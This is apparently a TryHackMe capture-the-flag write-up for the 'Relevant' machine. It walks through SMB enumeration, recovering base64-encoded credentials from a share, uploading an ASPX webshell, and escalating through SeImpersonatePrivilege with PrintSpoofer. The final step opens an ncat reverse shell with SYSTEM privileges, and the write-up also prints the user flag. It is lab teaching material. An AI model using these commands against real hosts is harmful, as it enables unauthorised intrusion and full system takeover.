### Introduction

[Relevant] is a medium CTF on TryHackMe. You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.

I did the machine without the use of metasploit but you can use It as to complete it too.

Let's start scanning the machine with nmap.

We can see some ports open.

```sh
nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
```

![scan](/images/THM/relevant/Captura.PNG)

We will start looking through smb.

{ *I used "gest" like username but my intention was to use "guest" xD.* }

```sh
smbmap -u <user> -p <password> -H <IP>
```

![smbmap dirs](/images/THM/relevant/Captura1.PNG)

We can see there are 4 Folders but we only have access to two of them.

If we look the content of the folder **nt4wrksv**, we can see there is a file called **passwords.txt**

```sh
smbmap -u <user> -p <password> -r 'nt4wrksv' -H <IP>
```

![smbmap dir nt4](/images/THM/relevant/Captura2.PNG)

Let's download It.

```sh
smbmap -u <user> -p <password> -H <IP> --download 'nt4wrksv\passwords.txt'
```

If we see the content we can see is encoded in base64.

```sh
cat <filename>
```

![cat file](/images/THM/relevant/Captura4.PNG)

Time to desencode It.

```sh
echo 'code' | base64 -d
```

Let's try to use psexec with both users and try if we could get a shell.

```sh
python3 /usr/local/bin/psexec.py <user>@<IP>
or
psexec.py <user>@<IP>
```

Both trys didn't work so, It's time to look more the 2 Webs.

Web in 80 and 49663 have the same default.

![IIS web](/images/THM/relevant/Captura10.PNG)

This time I will use dirbuster to change a little the enumeration tool.

The scan don't return nothing in both webs, but if we investigate a little, we can see that the smb folder is accessible via the web.

![Web dir](/images/THM/relevant/Captura12.PNG)

We're going to take advantage from our permissions, because we can write so, I uploaded a webshell.

```sh
smbmap -u <user> -p <password> -H <IP> --upload '/usr/share/webshells/aspx/cmdasp.aspx' 'nt4wrksv\cmdasp.aspx'
```

![WebShell upload](/images/THM/relevant/Captura13.PNG)

We can see It uploaded fine and we can write commands on It.

![WebShell](/images/THM/relevant/Captura14.PNG)

If we search a little we can find the user flag in the **Bob Desktop**.

```sh
type ..\..\..\Users\Bob\Desktop\user.txt
or
type C:\Users\Bob\Desktop\user.txt
```

![user flag](/images/THM/relevant/Captura15.PNG)

- User.txt
>Answer: THM{fdk4ka34vk346ksxfr21tg789ktf45}

It's time to elevate our privileges.

```sh
whoami
```

![whoami](/images/THM/relevant/Captura17.PNG)

So we look what privileges We've with our user

We can see our user have the **SeImpersonatePrivilege** which we can abuse this privilege to elevate our privileges.

If you want to know more you can search about **RootenPotato**.

```sh
whoami /priv
```

![whoami privi](/images/THM/relevant/Captura16.PNG)

In this case we are going to use [PrintSpoofer] that is a new tool more new and work better in windows 10 and Server 2016/2019.

![printspoofer github](/images/THM/relevant/Captura18.PNG)

We will upload the **PrintSpoofer** to the server.

```sh
smbmap -u <user> -p <password> -H <IP> --upload '<path to file>' 'nt4wrksv\<same name>'
```

![PrintSpoofer upload](/images/THM/relevant/Captura19.PNG)

And **ncat** too, to get a rever shell with the SYSTEM privileges.

```sh
smbmap -u <user> -p <password> -H <IP> --upload '/usr/share/windows-resources/ncat/ncat.exe' 'nt4wrksv\ncat.exe'
```

![ncat upload](/images/THM/relevant/Captura20.PNG)

Now we execute the command.

```sh
C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe -c "c:\inetpub\wwwroot\nt4wrksv\ncat.exe <IP> <port> -e cmd"
```

![Execution](/images/THM/relevant/Captura21.PNG)

And if all is okay we can see we got a shell with the SYSTEM perms.

```sh
nc -lvnp 4444
whoami
```

![nc listener](/images/THM/relevant/Captura22.PNG)

Now we can check the root flag and we've complete this machine.

```sh
cd C:\Users\Administrator\Desktop
type root.txt
or
type C:\Users\Administrator\Desktop\root.txt
```

![root flag](/images/THM/relevant/Captura23.PNG)

- Root.txt
